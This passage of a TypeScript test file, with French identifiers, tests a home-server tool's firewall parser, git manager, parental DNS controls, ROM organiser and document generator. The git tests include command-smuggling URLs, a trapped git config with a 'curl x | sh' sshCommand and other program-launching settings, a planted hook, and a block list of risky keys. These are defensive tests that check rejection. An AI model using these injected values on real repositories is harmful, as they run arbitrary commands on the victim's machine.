7777/tcp                   ALLOW IN    192.168.1.0/24
8000:8100/tcp              ALLOW IN    Anywhere
445/tcp                    DENY IN     Anywhere
22/tcp (v6)                ALLOW IN    Anywhere (v6)
53                         ALLOW OUT   Anywhere
`);
  assert.equal(ufw.actif, true); assert.equal(ufw.entrant, 'deny'); assert.equal(ufw.sortant, 'allow');
  assert.deepEqual(ufw.regles.filter((r) => !r.v6).map((r) => `${r.vers} ${r.action} ${r.depuis}`), ['22/tcp ALLOW Anywhere', '7777/tcp ALLOW 192.168.1.0/24', '8000:8100/tcp ALLOW Anywhere', '445/tcp DENY Anywhere']);
  assert.equal(lireUfw('Status: inactive\n').actif, false);
  assert.ok(couvre('22/tcp', 22, 'tcp') && !couvre('22/tcp', 22, 'udp') && couvre('53', 53, 'udp') && couvre('80,443/tcp', 443, 'tcp') && couvre('8000:8100/tcp', 8050, 'tcp') && !couvre('8000:8100/tcp', 8101, 'tcp') && !couvre('Samba', 445, 'tcp'));
  const de = (port: number) => acces(l.find((x) => x.port === port)!, ufw);
  assert.deepEqual(de(22), { acces: 'ouvert', depuis: 'tout le réseau' }); assert.deepEqual(de(7777), { acces: 'ouvert', depuis: '192.168.1.0/24' });
  assert.deepEqual(de(445), { acces: 'filtré' }); assert.deepEqual(de(5353), { acces: 'filtré' }, 'pas de règle et entrant refusé : filtré'); assert.deepEqual(de(6379), { acces: 'local' });
  assert.deepEqual(acces(l.find((x) => x.port === 445)!, { ...ufw, actif: false }), { acces: 'ouvert', depuis: 'tout le réseau' }, 'pare-feu éteint : tout ce qui écoute sur le réseau est joignable');
  assert.deepEqual(acces(l.find((x) => x.port === 445)!, undefined).acces, 'ouvert');
  assert.match(quiEst(l.find((x) => x.port === 22)!), /SSH/); assert.match(quiEst(l.find((x) => x.port === 445)!), /Samba/); assert.match(quiEst(l.find((x) => x.port === 7777)!), /Odin|interface/i);
  assert.equal(quiEst({ proto: 'tcp', port: 49152, adresse: '0.0.0.0', portee: 'réseau', prog: 'monappli' }), 'monappli');
  const routes = lireRoutes(JSON.stringify([{ dst: '192.168.1.0/24', dev: 'eth0' }, { dst: 'default', gateway: '192.168.1.1', dev: 'eth0' }, { dst: '10.8.0.0/24', dev: 'wg0' }]));
  assert.deepEqual(routes[0], { vers: 'Internet (par défaut)', via: '192.168.1.1', carte: 'eth0', defaut: true }); assert.equal(routes.length, 3); assert.deepEqual(lireRoutes('x'), []);
  assert.equal(dansConteneur((p) => p === '/.dockerenv', {}), true); assert.equal(dansConteneur(() => false, { container: 'podman' }), true); assert.equal(dansConteneur(() => false, {}), false);
});

// ---------------- Dédale ----------------
test('Dédale : état d\'un dépôt, adresses acceptées, jetons masqués, dépôts piégés reconnus', () => {
  const st = lireStatut(`# branch.oid 3973b27aa\n# branch.head valhalla-complet\n# branch.upstream origin/valhalla-complet\n# branch.ab +2 -5\n1 .M N... 100644 100644 100644 abc def src/a.ts\n2 R. N... 100644 100644 100644 abc def R100 b.ts\ta.ts\nu UU N... 100644 100644 100644 100644 a b c conflit.ts\n? nouveau.txt\n? autre.txt\n`);
  assert.deepEqual(st, { branche: 'valhalla-complet', amont: 'origin/valhalla-complet', avance: 2, retard: 5, modifies: 2, nonSuivis: 2, conflits: 1 });
  assert.equal(lireStatut('# branch.head (detached)\n').branche, '(détachée)');
  assert.deepEqual(resume(st), { texte: '1 conflit(s) · 2 fichier(s) modifié(s) · 2 nouveau(x) · 2 commit(s) à envoyer · 5 à récupérer', tone: 'mauvais' });
  assert.deepEqual(resume({ ...st, conflits: 0, modifies: 0, nonSuivis: 0, avance: 0, retard: 0 }), { texte: 'à jour', tone: 'bon' });
  assert.equal(resume({ branche: 'main', avance: 0, retard: 0, modifies: 0, nonSuivis: 0, conflits: 0 }).texte, 'pas de dépôt distant suivi'); assert.equal(resume(undefined).tone, 'mauvais');
  const lg = lireJournal('3973b27aa1\x1fToufa\x1f1731500000\x1fv1.17.0 : démarrage réseau\nligne cassée\n');
  assert.deepEqual(lg, [{ id: '3973b27aa1', auteur: 'Toufa', at: 1731500000000, sujet: 'v1.17.0 : démarrage réseau' }]);
  assert.equal(masquer('https://moi:ghp_SECRET123@github.com/TOUFATECH/odin.git'), 'https://github.com/TOUFATECH/odin.git');
  assert.equal(masquer('https://gitlab.com/a/b.git?private_token=abc123&x=1'), 'https://gitlab.com/a/b.git?private_token=•••&x=1');
  for (const ok of ['https://github.com/TOUFATECH/odin.git', 'git@github.com:TOUFATECH/odin.git', 'ssh://git@nas.local:2222/depots/site.git', 'https://git.exemple.fr:8443/moi/projet']) assert.ok(adresseOk(ok), ok);
  for (const non of ['ext::sh -c "id"', '--upload-pack=touch /tmp/x', 'file:///etc', 'https://github.com/a/b.git; rm -rf ~', 'http://github.com/a/b.git', 'git@hote:chemin avec espace', 'fd::17', 'https://exemple.fr/$(id)', '']) assert.ok(!adresseOk(non), non);
  assert.equal(nomDe('https://github.com/TOUFATECH/odin.git'), 'odin'); assert.equal(nomDe('git@github.com:moi/mon-site.git/'), 'mon-site'); assert.equal(nomDe('https://x.fr/a/..'), '');
  const piege = `core.repositoryformatversion=0\ncore.bare=false\nremote.origin.url=https://github.com/a/b.git\ncore.sshCommand=sh -c 'curl x | sh'\ncore.fsmonitor=/tmp/x.sh\nfilter.evil.smudge=sh evil.sh\ncredential.helper=!sh -c "id"\ncore.hookspath=/tmp/hooks\nremote.origin.uploadpack=sh evil\nmerge.x.driver=sh d %O %A %B\ninclude.path=/tmp/c`;
  assert.deepEqual(reglagesRisques(piege).sort(), ['core.fsmonitor', 'core.hookspath', 'core.sshcommand', 'credential.helper', 'filter.evil.smudge', 'include.path', 'merge.x.driver', 'remote.origin.uploadpack']);
  assert.deepEqual(reglagesRisques('core.bare=false\ncore.fsmonitor=true\ncredential.helper=store\nremote.origin.url=git@github.com:a/b.git\nbranch.main.remote=origin\nuser.name=Toufa'), [], 'un dépôt ordinaire passe');
});

test('Dédale, avec de vrais dépôts git : état, récupérer, mettre à jour sans risque, dépôt piégé refusé, dépôt de la maison', { skip: spawnSync('git', ['--version']).status !== 0 ? 'git absent' : false }, async () => {
  const w = world('dedale-');
  const env = { ...process.env, GIT_AUTHOR_NAME: 'Essai', GIT_AUTHOR_EMAIL: 'essai@exemple.fr', GIT_COMMITTER_NAME: 'Essai', GIT_COMMITTER_EMAIL: 'essai@exemple.fr', GIT_CONFIG_GLOBAL: join(w.home, 'gitconfig'), GIT_CONFIG_NOSYSTEM: '1' };
  const avant = { g: process.env.GIT_CONFIG_GLOBAL, n: process.env.GIT_CONFIG_NOSYSTEM }; process.env.GIT_CONFIG_GLOBAL = env.GIT_CONFIG_GLOBAL; process.env.GIT_CONFIG_NOSYSTEM = '1';
  const git = (dir: string, ...a: string[]) => execFileSync('git', ['-C', dir, ...a], { env, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  try {
    const code = join(w.home, 'code'), origine = join(w.home, 'origine.git'), autre = join(w.home, 'autre'); mkdirSync(code);
    execFileSync('git', ['init', '--bare', '--quiet', '--initial-branch=main', origine], { env });
    execFileSync('git', ['clone', '--quiet', origine, join(code, 'site')], { env, stdio: 'ignore' });
    const site = join(code, 'site'); git(site, 'checkout', '-q', '-b', 'main'); writeFileSync(join(site, 'index.html'), '<h1>Site</h1>'); git(site, 'add', '.'); git(site, 'commit', '-q', '-m', 'premier commit'); git(site, 'push', '-q', '-u', 'origin', 'main');
    assert.equal((await w.v.act('ivaldi', 'dossier', { chemin: code })).ok, true);
    assert.match((await w.v.act('ivaldi', 'depots')).text, /- site \[main\] : à jour · dernier commit .* « premier commit »/);
    // Du travail en cours et un commit pas envoyé.
    writeFileSync(join(site, 'page.html'), 'x'); git(site, 'add', '.'); git(site, 'commit', '-q', '-m', 'deuxième'); writeFileSync(join(site, 'brouillon.txt'), 'x');
    assert.match((await w.v.act('ivaldi', 'depots')).text, /site \[main\] : 1 nouveau\(x\) · 1 commit\(s\) à envoyer/);
    assert.match((await w.v.act('ivaldi', 'journal', { depot: 'site' })).text, /deuxième[\s\S]*premier commit/);
    git(site, 'push', '-q'); rmSync(join(site, 'brouillon.txt'));
    // Quelqu'un d'autre pousse : Dédale le voit (récupérer), puis met à jour en avance rapide.
    execFileSync('git', ['clone', '--quiet', origine, autre], { env, stdio: 'ignore' }); writeFileSync(join(autre, 'nouveau.txt'), 'x'); git(autre, 'add', '.'); git(autre, 'commit', '-q', '-m', 'venu d\'ailleurs'); git(autre, 'push', '-q');
    assert.match((await w.v.act('ivaldi', 'recuperer', { depot: 'site' })).text, /site : 1 commit\(s\) à récupérer/);
    writeFileSync(join(site, 'index.html'), '<h1>Modifié</h1>');
    const refus = await w.v.act('ivaldi', 'mettre_a_jour', { depot: 'site' }); assert.equal(refus.ok, false); assert.match(refus.text, /travail en cours/);
    git(site, 'checkout', '-q', '--', 'index.html');
    // Un script de dépôt (hook) ne doit jamais être lancé par Odin.
    mkdirSync(join(site, '.git', 'hooks'), { recursive: true }); writeFileSync(join(site, '.git', 'hooks', 'post-merge'), `#!/bin/sh\ntouch "${join(w.home, 'HOOK-LANCE')}"\n`, { mode: 0o755 });
    const maj = await w.v.act('ivaldi', 'mettre_a_jour', { depot: 'site' }); assert.equal(maj.ok, true, maj.text); assert.ok(existsSync(join(site, 'nouveau.txt')));
    assert.ok(!existsSync(join(w.home, 'HOOK-LANCE')), 'le script du dépôt n\'a pas été lancé');
    // Dépôt piégé : un réglage qui lance un programme → Odin n'y touche pas (et le programme n'est pas lancé).
    git(site, 'config', 'core.sshCommand', `sh -c 'touch ${join(w.home, 'PIEGE-LANCE')}'`);
    const piege = await w.v.act('ivaldi', 'recuperer', { depot: 'site' }); assert.match(piege.text, /laissé .*core\.sshcommand/);
    assert.equal((await w.v.act('ivaldi', 'mettre_a_jour', { depot: 'site' })).ok, false); assert.ok(!existsSync(join(w.home, 'PIEGE-LANCE')));
    // Cloner : adresse refusée si elle lance un programme ; dépôt de la maison créé.
    assert.equal((await w.v.act('ivaldi', 'cloner', { adresse: 'ext::sh -c "touch /tmp/x"' })).ok, false);
    const cree = await w.v.act('ivaldi', 'creer_depot', { nom: 'boutique' }); assert.equal(cree.ok, true); assert.match(cree.text, /git push maison main/);
    assert.equal((await w.v.act('ivaldi', 'creer_depot', { nom: '../evasion' })).ok, false);
    const page = await w.mod('ivaldi').view(w.v.ctx('ivaldi'), new URLSearchParams());
    assert.ok((page.sections.find((s) => s.title === 'Dépôts de la maison') as { rows: unknown[] }).rows.length === 1);
  } finally { if (avant.g === undefined) delete process.env.GIT_CONFIG_GLOBAL; else process.env.GIT_CONFIG_GLOBAL = avant.g; if (avant.n === undefined) delete process.env.GIT_CONFIG_NOSYSTEM; else process.env.GIT_CONFIG_NOSYSTEM = avant.n; w.end(); }
});

// ---------------- Héra ----------------
test('Héra : adresses, domaine principal, rapport d\'un enfant', () => {
  assert.deepEqual(adresses('192.168.1.20, 192.168.1.21;192.168.1.20'), ['192.168.1.20', '192.168.1.21']);
  assert.throws(() => adresses('192.168.1.300'), /invalide/); assert.throws(() => adresses('tablette'), /invalide/);
  assert.equal(domainePrincipal('cdn.video.exemple.fr'), 'exemple.fr'); assert.equal(domainePrincipal('news.bbc.co.uk'), 'bbc.co.uk'); assert.equal(domainePrincipal('www.impots.gouv.fr'), 'impots.gouv.fr'); assert.equal(domainePrincipal('Exemple.FR.'), 'exemple.fr');
  const clients = {
    '192.168.1.20': { n: 120, b: 15, threats: 1, first: 1000, last: 9000, domains: { 'www.youtube.com': { n: 60, b: 0 }, 'i.ytimg.com': { n: 20, b: 0 }, 'm.youtube.com': { n: 10, b: 0 }, 'www.tiktok.com': { n: 12, b: 12 }, 'ads.exemple.net': { n: 3, b: 3 } } },
    '192.168.1.21': { n: 30, b: 0, threats: 0, first: 500, last: 4000, domains: { 'fr.wikipedia.org': { n: 30, b: 0 } } },
    '192.168.1.99': { n: 999, b: 0, threats: 0, first: 1, last: 99999, domains: { 'autre.fr': { n: 999, b: 0 } } },
  };
  const r = rapport(clients, ['192.168.1.20', '192.168.1.21', '192.168.1.50']);
  assert.deepEqual({ requetes: r.requetes, bloquees: r.bloquees, dangereuses: r.dangereuses, premier: r.premier, dernier: r.dernier }, { requetes: 150, bloquees: 15, dangereuses: 1, premier: 500, dernier: 9000 });
  assert.deepEqual(r.sites.slice(0, 3), [{ site: 'youtube.com', n: 70, b: 0 }, { site: 'wikipedia.org', n: 30, b: 0 }, { site: 'ytimg.com', n: 20, b: 0 }]);
  assert.deepEqual(r.refuses, [{ site: 'tiktok.com', b: 12 }, { site: 'exemple.net', b: 3 }]);
  assert.ok(AGES.petit.services.length > AGES.enfant.services.length && AGES.ado.services.length === 0 && !AGES.adulte.filtre);
});

test('Héra règle le vrai Sphinx : profil, coucher, pause, reprise, retrait', async () => {
  const w = world('hera-');
  try {
    const regles = () => ((w.v.ctx('vidarr').settings.dns as { clients?: unknown[] } | undefined)?.clients ?? []) as Array<{ name: string; ids: string[]; parental?: boolean; safeSearch?: boolean; services?: string[]; cut?: boolean; cutSchedule?: unknown; filtering?: string }>;
    const r = await w.v.act('heidrun', 'profil', { nom: 'Inaya', age: 'petit', appareils: '192.168.1.20, 192.168.1.21' });
    assert.equal(r.ok, true, r.text); assert.doesNotMatch(r.text, /⚠/, `Sphinx a refusé un réglage : ${r.text}`);
    const regle = () => regles().find((c) => c.name === 'Héra · Inaya');
    assert.ok(regle(), 'la règle est posée dans Sphinx');
    assert.deepEqual(regle()!.ids, ['192.168.1.20', '192.168.1.21']); assert.equal(regle()!.parental, true); assert.equal(regle()!.safeSearch, true);
    assert.deepEqual([...regle()!.services!].sort(), [...AGES.petit.services].sort(), 'tous les services de l\'âge sont connus de Sphinx');
    assert.equal(regle()!.cut, true); assert.ok(regle()!.cutSchedule, 'l\'heure du coucher conseillée est posée (coupure à horaires)');
    // Chaque âge passe sans refus de Sphinx.
    for (const [k, age] of ['enfant', 'ado', 'adulte'].entries()) { const x = await w.v.act('heidrun', 'profil', { nom: `Essai ${age}`, age, appareils: `192.168.1.${30 + k}` }); assert.equal(x.ok, true, x.text); assert.doesNotMatch(x.text, /⚠/, x.text); }
    assert.equal(regles().find((c) => c.name === 'Héra · Essai adulte')!.cut, undefined, 'un adulte n\'a pas d\'heure de coucher');
    // Un appareil ne peut pas être dans deux profils.
    assert.equal((await w.v.act('heidrun', 'profil', { nom: 'Autre', age: 'ado', appareils: '192.168.1.20' })).ok, false);
    // Pause : coupé tout de suite (sans horaire) ; reprise : l'heure du coucher revient.
    assert.equal((await w.v.act('heidrun', 'pause', { nom: 'inaya' })).ok, true); assert.equal(regle()!.cut, true); assert.equal(regle()!.cutSchedule, undefined, 'en pause : coupé sans horaire');
    assert.match((await w.v.act('heidrun', 'profils')).text, /Inaya .*en pause/);
    assert.equal((await w.v.act('heidrun', 'reprendre', { nom: 'Inaya' })).ok, true); assert.equal(regle()!.cut, true); assert.ok(regle()!.cutSchedule, 'après la pause, le coucher est de nouveau à horaires');
    // « Coucher : non » → plus de coupure du tout.
    assert.equal((await w.v.act('heidrun', 'profil', { nom: 'Inaya', age: 'petit', coucher_de: 'non' })).ok, true); assert.equal(regle()!.cut, undefined); assert.deepEqual(regle()!.ids, ['192.168.1.20', '192.168.1.21'], 'les appareils sont gardés');
    assert.equal((await w.v.act('heidrun', 'profil', { nom: 'Inaya', age: 'petit', coucher_de: '25:00' })).ok, false);
    assert.match((await w.v.act('heidrun', 'rapport', { nom: 'Inaya' })).text, /Inaya · aujourd'hui/);
    assert.equal((await w.v.act('heidrun', 'retirer', { nom: 'Inaya' })).ok, true); assert.equal(regle(), undefined, 'la règle est retirée de Sphinx');
    assert.equal((await w.v.act('heidrun', 'rapport', { nom: 'Inaya' })).ok, false);
  } finally { w.end(); }
});

// ---------------- Olympie ----------------
test('Olympie : console d\'un fichier, nom propre, pistes de disque, variantes, liste RetroArch', () => {
  assert.equal(consoleDe('/roms/snes/Zelda.sfc')?.id, 'snes'); assert.equal(consoleDe('/vrac/Tetris (World).gb')?.id, 'gb'); assert.equal(consoleDe('C:\\Jeux\\megadrive\\Sonic.md')?.id, 'megadrive');
  assert.equal(consoleDe('/notes/README.md'), undefined, '« .md » hors d\'un dossier Mega Drive est du Markdown');
  assert.equal(consoleDe('/roms/psx/Final Fantasy VII (Disc 1).cue')?.id, 'psx'); assert.equal(consoleDe('/telechargements/archive.zip'), undefined); assert.equal(consoleDe('/roms/arcade/mslug.zip')?.id, 'arcade'); assert.equal(consoleDe('/roms/snes/notes.txt'), undefined);
  assert.deepEqual(nomPropre('Sonic the Hedgehog (Europe) (Rev 1) [!].md'), { nom: 'Sonic the Hedgehog', region: 'Europe' });
  assert.deepEqual(nomPropre('Legend of Zelda, The - A Link to the Past (France).sfc'), { nom: 'Legend of Zelda, The - A Link to the Past', region: 'France' });
  assert.deepEqual(nomPropre('Addams Family, The (USA).sfc'), { nom: 'The Addams Family', region: 'USA' }); assert.deepEqual(nomPropre('Super_Mario_World.smc'), { nom: 'Super Mario World' });
  const d = mkdtempSync(join(tmpdir(), 'olympie-'));
  try {
    for (const p of ['snes', 'psx', 'megadrive', 'docs', '.cache']) mkdirSync(join(d, p));
    writeFileSync(join(d, 'snes', 'Super Mario World (Europe).sfc'), 'a'); writeFileSync(join(d, 'snes', 'Super Mario World (USA).sfc'), 'ab'); writeFileSync(join(d, 'snes', 'F-Zero (Japan).sfc'), 'a');
    writeFileSync(join(d, 'psx', 'Crash (Europe).cue'), 'a'); writeFileSync(join(d, 'psx', 'Crash (Europe).bin'), 'gros disque'); writeFileSync(join(d, 'megadrive', 'Sonic (World).md'), 'a');
    writeFileSync(join(d, 'docs', 'liste.md'), '# pas un jeu'); writeFileSync(join(d, '.cache', 'cache.sfc'), 'a');
    const l = ranger([d]);
    assert.deepEqual(l.map((j) => `${j.console}:${j.nom}${j.region ? ` (${j.region})` : ''}`), ['megadrive:Sonic (World)', 'psx:Crash (Europe)', 'snes:F-Zero (Japan)', 'snes:Super Mario World (Europe)', 'snes:Super Mario World (USA)']);
    assert.deepEqual(variantes(l).map((g) => g.map((j) => j.region)), [['Europe', 'USA']]);
    const snes = CONSOLES.find((c) => c.id === 'snes')!, lpl = JSON.parse(listeRetroarch(snes, l.filter((j) => j.console === 'snes'))) as { items: Array<{ path: string; label: string; db_name: string }> };
    assert.equal(lpl.items.length, 3); assert.equal(lpl.items[0].label, 'F-Zero'); assert.equal(lpl.items[0].db_name, 'Nintendo - Super Nintendo Entertainment System.lpl'); assert.ok(lpl.items[0].path.endsWith('.sfc'));
  } finally { rmSync(d, { recursive: true, force: true }); }
  assert.equal(new Set(CONSOLES.map((c) => c.id)).size, CONSOLES.length); assert.ok(CONSOLES.length >= 19);
});

test('Olympie : ranger, chercher, favori ; lancer refuse proprement sans RetroArch', async () => {
  const w = world('olympie-app-');
  try {
    const d = join(w.home, 'ROMs', 'gba'); mkdirSync(d, { recursive: true }); writeFileSync(join(d, 'Pokemon Emeraude (France).gba'), 'x');
    assert.equal((await w.v.act('leikvangr', 'dossier', { chemin: join(w.home, 'ROMs') })).ok, true);
    assert.match((await w.v.act('leikvangr', 'ranger')).text, /1 jeu/);
    assert.match((await w.v.act('leikvangr', 'jeux', { console: 'gba' })).text, /Pokemon Emeraude/);
    assert.equal((await w.v.act('leikvangr', 'favori', { jeu: 'pokemon' })).ok, true); assert.equal((w.v.ctx('leikvangr').settings.favoris as string[]).length, 1);
    assert.equal((await w.v.act('leikvangr', 'favori', { jeu: 'inconnu' })).ok, false);
  } finally { w.end(); }
});

// ---------------- Plume ----------------
test('Plume : un texte simple devient un document Word, OpenDocument, une page web ; un tableur garde nombres et formules', () => {
  const md = '# Devis\n\nBonjour **Fatima**, voici le *devis* demandé & <signé>.\n\n- Site vitrine\n- Hébergement\n\n1. Acompte\n2. Solde\n\n| Poste | Prix |\n| --- | --- |\n| Site | 1 200 € |\n| Logo | 300 € |\n\nCordialement,\nToufa';
  const b = blocs(md);
  assert.deepEqual(b.map((x) => x.k), ['h', 'p', 'li', 'li', 'li', 'li', 'table', 'p']);
  assert.deepEqual(b[1].k === 'p' ? b[1].r : [], [{ t: 'Bonjour ' }, { t: 'Fatima', b: true }, { t: ', voici le ' }, { t: 'devis', i: true }, { t: ' demandé & <signé>.' }]);
  assert.deepEqual(b[6].k === 'table' ? b[6].rows : [], [['Poste', 'Prix'], ['Site', '1 200 €'], ['Logo', '300 €']], 'la ligne de séparation du tableau est retirée');
  assert.deepEqual(b[7].k === 'p' ? b[7].r : [], [{ t: 'Cordialement, Toufa' }]);
  assert.deepEqual(morceaux('***fort*** et 2 * 3 = 6'), [{ t: 'fort', b: true, i: true }, { t: ' et 2 * 3 = 6' }]);
  // Word
  const w = docx('Devis n° 12', md), z = unzip(w);
  for (const f of ['[Content_Types].xml', '_rels/.rels', 'word/document.xml', 'word/styles.xml', 'word/_rels/document.xml.rels']) assert.ok(z.has(f), f);
  const texte = texteDocx(w);
  assert.match(texte, /^Devis n° 12\nDevis\nBonjour Fatima, voici le devis demandé & <signé>\.\n• Site vitrine\n• Hébergement\n1\. Acompte\n2\. Solde\nPoste\tPrix\nSite\t1 200 €\nLogo\t300 €\n\nCordialement, Toufa$/);
  assert.match(z.get('word/document.xml')!.toString('utf8'), /<w:b\/><\/w:rPr><w:t xml:space="preserve">Fatima<\/w:t>/);
  // OpenDocument : « mimetype » en premier et sans compression (sinon LibreOffice refuse le fichier).
  const o = odt('Devis n° 12', md);
  assert.equal(o.readUInt32LE(0), 0x04034b50); assert.equal(o.readUInt16LE(8), 0, 'mimetype non compressé'); assert.equal(o.subarray(30, 38).toString(), 'mimetype'); assert.equal(o.subarray(38, 38 + 39).toString(), 'application/vnd.oasis.opendocument.text');
  assert.match(texteOdf(o), /Devis n° 12\nDevis\nBonjour Fatima, voici le devis demandé & <signé>\.\nSite vitrine\nHébergement\n1\. Acompte\n2\. Solde\nPoste\tPrix\nSite\t1 200 €\nLogo\t300 €\nCordialement, Toufa/);
  // Page web : rien de ce que tu écris ne devient du code.
  const h = html('Note <b>', 'Texte <script>alert(1)</script> **gras**');
  assert.ok(h.includes('<h1>Note &lt;b&gt;</h1>') && h.includes('&lt;script&gt;alert(1)&lt;/script&gt; <strong>gras</strong>') && !h.includes('<script>'));
  assert.match(texteDe('page.html', Buffer.from(h)), /Texte <script>alert\(1\)<\/script> gras/);
  // Tableur
  const rows = lignesCsv('Produit;Prix;Quantité\n"Site; vitrine";1200,50;1\nLogo;300;2\nTotal;=SUM(B2:B3);"dit ""ok"""\n\n');
  assert.deepEqual(rows, [['Produit', 'Prix', 'Quantité'], ['Site; vitrine', '1200,50', '1'], ['Logo', '300', '2'], ['Total', '=SUM(B2:B3)', 'dit "ok"']]);
  assert.deepEqual(lignesCsv('a,b\n1,2'), [['a', 'b'], ['1', '2']]); assert.deepEqual(lignesCsv('a\tb\n1\t2'), [['a', 'b'], ['1', '2']]);
  const x = xlsx(rows, 'Devis/2026'), sheet = unzip(x).get('xl/worksheets/sheet1.xml')!.toString('utf8');
  assert.match(sheet, /<c r="B2"><v>1200\.50<\/v><\/c>/); assert.match(sheet, /<c r="B4"><f>SUM\(B2:B3\)<\/f><\/c>/); assert.match(sheet, /<c r="A2" t="inlineStr"><is><t xml:space="preserve">Site; vitrine<\/t>/);
  assert.match(unzip(x).get('xl/workbook.xml')!.toString('utf8'), /name="Devis 2026"/, 'le nom de feuille est nettoyé');
  assert.deepEqual(lignesXlsx(x).slice(0, 3), [['Produit', 'Prix', 'Quantité'], ['Site; vitrine', '1200.50', '1'], ['Logo', '300', '2']]);
  assert.deepEqual(compter('Bonjour à tous, c\'est l\'été : 3 jours !'), { mots: 7, caracteres: 31, minutes: 1 });
  assert.ok(dossierPermis('/home/moi/Documents', '/home/moi')); for (const non of ['/', '/home/moi', '/home/moi/.ssh', '/etc/ssl', '/home/moi/Documents/.cache']) assert.ok(!dossierPermis(non, '/home/moi'), non);
  assert.ok(!dossierPermis('/home/moi/.odin/x', '/home/moi', '/home/moi/.odin')); assert.ok(!dossierPermis('/srv', '/home/moi', '/srv/odin'), 'un dossier qui contient les données d\'Odin est refusé');
});

test('Plume : les fichiers créés s\'ouvrent dans de vrais lecteurs (python-docx, openpyxl) quand ils sont là', { skip: spawnSync('python3', ['-c', 'import docx, openpyxl']).status !== 0 ? 'python-docx / openpyxl absents' : false }, () => {
  const d = mkdtempSync(join(tmpdir(), 'plume-vrai-'));
  try {
    writeFileSync(join(d, 'a.docx'), docx('Compte rendu', '# Décisions\n\n- **Budget** validé\n\n| Quoi | Qui |\n| --- | --- |\n| Site | Toufa |'));
    writeFileSync(join(d, 'a.xlsx'), xlsx([['Produit', 'Prix'], ['Site', '1200,5'], ['Logo', '300'], ['Total', '=SUM(B2:B3)']], 'Devis'));
    const py = `import docx, openpyxl, json, sys
d = docx.Document(sys.argv[1] + '/a.docx')
w = openpyxl.load_workbook(sys.argv[1] + '/a.xlsx')
s = w.active
print(json.dumps({'paras': [p.text for p in d.paragraphs if p.text], 'styles': [p.style.name for p in d.paragraphs if p.text], 'table': [[c.text for c in r.cells] for r in d.tables[0].rows], 'gras': [r.text for p in d.paragraphs for r in p.runs if r.bold], 'feuille': s.title, 'b2': s['B2'].value, 'b4': s['B4'].value, 'a1': s['A1'].value}))`;
    const r = JSON.parse(execFileSync('python3', ['-c', py, d], { encoding: 'utf8' })) as { paras: string[]; styles: string[]; table: string[][]; gras: string[]; feuille: string; b2: number; b4: string; a1: string };
    assert.deepEqual(r.paras, ['Compte rendu', 'Décisions', '• Budget validé']); assert.deepEqual(r.styles, ['Title', 'Heading 1', 'List Paragraph']);
    assert.deepEqual(r.table, [['Quoi', 'Qui'], ['Site', 'Toufa']]); assert.ok(r.gras.includes('Budget'));
    assert.deepEqual({ feuille: r.feuille, b2: r.b2, b4: r.b4, a1: r.a1 }, { feuille: 'Devis', b2: 1200.5, b4: '=SUM(B2:B3)', a1: 'Produit' });
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('Plume : créer, lire, chercher dans tes dossiers seulement ; jamais écraser un fichier', async (t) => {
  const w = world('plume-');
  try {
    const hors = mkdtempSync(join(tmpdir(), 'plume-docs-')), docs = join(hors, 'Documents'); mkdirSync(docs); t.after(() => rmSync(hors, { recursive: true, force: true }));
    assert.equal((await w.v.act('snotra', 'dossier', { chemin: w.home })).ok, false, 'le dossier d\'Odin n\'est pas un dossier de documents');
    assert.equal((await w.v.act('snotra', 'dossier', { chemin: join(w.home, 'x') })).ok, false);
    assert.equal((await w.v.act('snotra', 'dossier', { chemin: docs })).ok, true);
    const c1 = await w.v.act('snotra', 'creer', { titre: 'Lettre à la mairie', texte: 'Madame, Monsieur,\n\nJe demande un **rendez-vous** pour le permis.', format: 'docx' });
    assert.equal(c1.ok, true, c1.text); const f1 = (c1.data as { chemin: string }).chemin; assert.equal(f1, join(docs, 'Plume', 'Lettre à la mairie.docx'));
    const c2 = await w.v.act('snotra', 'creer', { titre: 'Lettre à la mairie', texte: 'autre', format: 'docx' });
    assert.equal((c2.data as { chemin: string }).chemin, join(docs, 'Plume', 'Lettre à la mairie (2).docx'), 'un fichier existant n\'est jamais écrasé');
    assert.equal((await w.v.act('snotra', 'creer', { titre: '../../evasion', texte: 'x', format: 'md' })).ok, true); assert.ok(existsSync(join(docs, 'Plume', 'evasion.md')), 'un titre ne sort jamais du dossier');
    assert.equal((await w.v.act('snotra', 'tableur', { titre: 'Devis', lignes: 'Poste;Prix\nSite;1200\nTotal;=SUM(B2:B2)' })).ok, true);
    assert.equal((await w.v.act('snotra', 'modele', { modele: 'compte_rendu', format: 'odt' })).ok, true); assert.ok(existsSync(join(docs, 'Plume', 'Compte rendu de réunion.odt')));
    const lu = await w.v.act('snotra', 'lire', { fichier: 'Lettre à la mairie' });
    assert.match(lu.text, /Lettre à la mairie\.docx · \d+ mot\(s\)/); assert.match(lu.text, /Je demande un rendez-vous pour le permis\./);
    assert.match((await w.v.act('snotra', 'lire', { fichier: 'Devis.xlsx' })).text, /Poste\tPrix\nSite\t1200/);
    assert.match((await w.v.act('snotra', 'lire', { fichier: 'compte rendu' })).text, /Sujets abordés/);
    const ch = await w.v.act('snotra', 'chercher', { q: 'permis rendez-vous' }); assert.match(ch.text, /1 document\(s\)[\s\S]*Lettre à la mairie\.docx/);
    assert.match((await w.v.act('snotra', 'documents', { genre: 'tableur' })).text, /1 document\(s\)[\s\S]*Devis\.xlsx/);
    // Hors des dossiers : refusé, même avec un chemin exact.
    writeFileSync(join(w.home, 'secret.txt'), 'mot de passe');
    assert.equal((await w.v.act('snotra', 'lire', { fichier: join(w.home, 'secret.txt') })).ok, false); assert.equal((await w.v.act('snotra', 'lire', { fichier: '/etc/passwd' })).ok, false);
    const page = await w.mod('snotra').view(w.v.ctx('snotra'), new URLSearchParams());
    assert.equal(page.kpis?.[0].value, '5');
  } finally { w.end(); }
});

test('Plume : les fichiers créés s\'ouvrent dans LibreOffice (conversion en PDF)', { skip: spawnSync('soffice', ['--version'], { timeout: 20_000 }).status !== 0 ? 'LibreOffice absent' : false, timeout: 180_000 }, () => {
  const d = mkdtempSync(join(tmpdir(), 'plume-lo-'));
  try {
    const md = '# Titre\n\nUn **texte** avec *accent* : été.\n\n- un\n- deux\n\n| A | B |\n| --- | --- |\n| 1 | 2 |';
    writeFileSync(join(d, 'essai.odt'), odt('Essai', md)); writeFileSync(join(d, 'essai2.docx'), docx('Essai', md)); writeFileSync(join(d, 'essai3.xlsx'), xlsx([['A', 'B'], ['1', '2'], ['Total', '=SUM(A2:B2)']]));
    for (const f of ['essai.odt', 'essai2.docx', 'essai3.xlsx']) {
